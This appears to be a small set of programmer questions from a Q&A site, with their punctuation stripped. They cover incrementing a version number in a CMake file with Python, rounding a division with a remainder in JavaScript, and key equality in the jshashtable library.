replacing a string in a text file  i wrote a script that will open my text file search for a certain word  then select the line that contains this word ans split it into three parts  then it chooses the part which is a number and add 1 to it  so every time i run the script one is added to this number. here is the script:   <pre><code>#!/usr/bin/env python inputfile = open( cmakelists.txt    r )  version = none saved =     for line in inputfile:     if  _patch   in line:         print  inside:    line         version = line      else:         saved += line  inputfile.close()  inputfile = open( cmakelists.txt    w )  x = version.split(   ) print  x:    x  a = x[0] b = int(x[1]) + 1 c = x[2]  new_version = str(a) +     + str(b) +     + str(c) print  new_version:    new_version  inputfile.write(str(saved)) inputfile.write(str(new_version))  inputfile.close() </code></pre>   but my problem is that the new number is being written at the end of the file  i want it to stay in its original place. any ideas      thanks,python
divide a floating number  rounding it to 2 decimals  and calculate the remainder  say i have the following number 2 74.    if you divide this number by 4  the result is 0.685.    i want to divide this number by 4 but the result should be rounded to 2 decimals. so my result should be:    3 times 0.69 and a remainder of 0.67    does anyone have a clue how to do that in javascript  i have absolutely no idea how i should tackle this.,javascript

jshashtable not recognizing equivalent keys  i m using jshashtable.js by tim down. i m populating two different hashtables using the following key object which implements both hashcode() and equals():   <pre><code>function key(did  oid){          this.did = did;      this.oid = oid;               this.hashcode = function(obj) {     //alert( hashcode:   + this.did+ - +this.oid);        return this.did+ - +this.oid;     }      this.equals = function(obj) {     //alert( obj.did:  + obj.did +   this.did:   + this.did +  \nobj.oid:   + obj.oid +   this.oid:   + this.oid);     //alert( did compare:   + obj.did == this.did +   oid compare:   + obj.oid == this.oid);     alert( obj instanceof key:   + obj instanceof key);     return (obj instanceof key) &amp;&amp;        (obj.did == this.did) &amp;&amp;        (obj.oid == this.oid);     }; } </code></pre>   i m then iterating over one hashtable and using containskey() in order to decide if this key exists in the hashtable that i m iterating over and adding the new key/value pair  or not  based on the boolean returned from containskey(). the problem that i m seeing is that although the hashcode() method alerts the same string  the object equals() is returning false  so it always thinks it has a new key.    i tried using a literal string as the key also did+ - +oid  which i thought should work too. when it didn t  i tried the object with hashcode() and equals() which also doesn t seem to work.     perhaps worth noting is that oid could be a string  5  or a number 5. however  i thought that since javascript isn t strongly typed  that difference shouldn t matter - especially since  when concatenated with the did+ -  it should become a string.      any ideas on why the comparisons don t seem to be working  thanks in advance,javascript
